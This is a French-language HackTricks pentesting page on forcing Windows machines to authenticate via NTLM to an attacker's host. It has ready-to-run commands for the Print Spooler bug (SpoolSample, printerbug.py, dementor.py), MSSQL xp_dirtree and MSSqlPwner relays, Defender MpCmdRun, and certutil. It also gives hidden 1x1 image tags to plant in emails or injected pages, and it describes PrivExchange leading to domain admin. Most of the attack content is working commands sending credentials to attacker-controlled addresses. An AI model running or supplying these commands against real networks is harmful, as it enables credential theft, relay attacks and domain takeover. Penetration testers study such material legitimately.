# Forcer l'authentification privilégiée NTLM

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Partagez des astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.

</details>
{% endhint %}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) est une **collection** de **déclencheurs d'authentification à distance** codés en C# utilisant le compilateur MIDL pour éviter les dépendances tierces.

## Abus du service Spooler

Si le service _**Print Spooler**_ est **activé**, vous pouvez utiliser des identifiants AD déjà connus pour **demander** au serveur d'impression du contrôleur de domaine une **mise à jour** sur les nouvelles tâches d'impression et simplement lui dire de **envoyer la notification à un système**.\
Notez que lorsque l'imprimante envoie la notification à des systèmes arbitraires, elle doit **s'authentifier contre** ce **système**. Par conséquent, un attaquant peut faire en sorte que le service _**Print Spooler**_ s'authentifie contre un système arbitraire, et le service **utilisera le compte d'ordinateur** dans cette authentification.

### Trouver des serveurs Windows sur le domaine

En utilisant PowerShell, obtenez une liste de machines Windows. Les serveurs sont généralement prioritaires, concentrons-nous donc là-dessus :
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Finding Spooler services listening

En utilisant un @mysmartlogin légèrement modifié (Vincent Le Toux) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), vérifiez si le service Spooler est à l'écoute :
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Vous pouvez également utiliser rpcdump.py sur Linux et rechercher le protocole MS-RPRN.
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### Demander au service de s'authentifier contre un hôte arbitraire

Vous pouvez compiler[ **SpoolSample depuis ici**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
ou utilisez [**dementor.py de 3xocyte**](https://github.com/NotMedic/NetNTLMtoSilverTicket) ou [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) si vous êtes sur Linux
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### Combinaison avec la Délégation Non Contraignante

Si un attaquant a déjà compromis un ordinateur avec [Délégation Non Contraignante](unconstrained-delegation.md), l'attaquant pourrait **faire authentifier l'imprimante contre cet ordinateur**. En raison de la délégation non contraignante, le **TGT** du **compte d'ordinateur de l'imprimante** sera **enregistré dans** la **mémoire** de l'ordinateur avec délégation non contraignante. Comme l'attaquant a déjà compromis cet hôte, il pourra **récupérer ce ticket** et en abuser ([Pass the Ticket](pass-the-ticket.md)).

## Authentification RCP Forcée

{% embed url="https://github.com/p0dalirius/Coercer" %}

## PrivExchange

L'attaque `PrivExchange` est le résultat d'un défaut trouvé dans la **fonctionnalité `PushSubscription` du Serveur Exchange**. Cette fonctionnalité permet au serveur Exchange d'être forcé par tout utilisateur de domaine ayant une boîte aux lettres à s'authentifier auprès de tout hôte fourni par le client via HTTP.

Par défaut, le **service Exchange s'exécute en tant que SYSTEM** et se voit accorder des privilèges excessifs (en particulier, il a des **privilèges WriteDacl sur le domaine avant la mise à jour cumulative de 2019**). Ce défaut peut être exploité pour permettre le **transfert d'informations vers LDAP et ensuite extraire la base de données NTDS du domaine**. Dans les cas où le transfert vers LDAP n'est pas possible, ce défaut peut encore être utilisé pour transférer et s'authentifier auprès d'autres hôtes au sein du domaine. L'exploitation réussie de cette attaque accorde un accès immédiat à l'Administrateur de Domaine avec n'importe quel compte utilisateur de domaine authentifié.

## À l'intérieur de Windows

Si vous êtes déjà à l'intérieur de la machine Windows, vous pouvez forcer Windows à se connecter à un serveur en utilisant des comptes privilégiés avec :

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Ou utilisez cette autre technique : [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Il est possible d'utiliser certutil.exe lolbin (binaire signé par Microsoft) pour forcer l'authentification NTLM :
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### Via email

Si vous connaissez l'**adresse email** de l'utilisateur qui se connecte à une machine que vous souhaitez compromettre, vous pourriez simplement lui envoyer un **email avec une image 1x1** telle que
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
et quand il l'ouvre, il essaiera de s'authentifier.

### MitM

Si vous pouvez effectuer une attaque MitM sur un ordinateur et injecter du HTML dans une page qu'il visualisera, vous pourriez essayer d'injecter une image comme celle-ci dans la page :
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Cracking NTLMv1

Si vous pouvez capturer [les défis NTLMv1 lisez ici comment les craquer](../ntlm/#ntlmv1-attack).\
&#xNAN;_&#x52;appelez-vous qu'afin de craquer NTLMv1, vous devez définir le défi Responder sur "1122334455667788"_

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Partagez des astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.

</details>
{% endhint %}
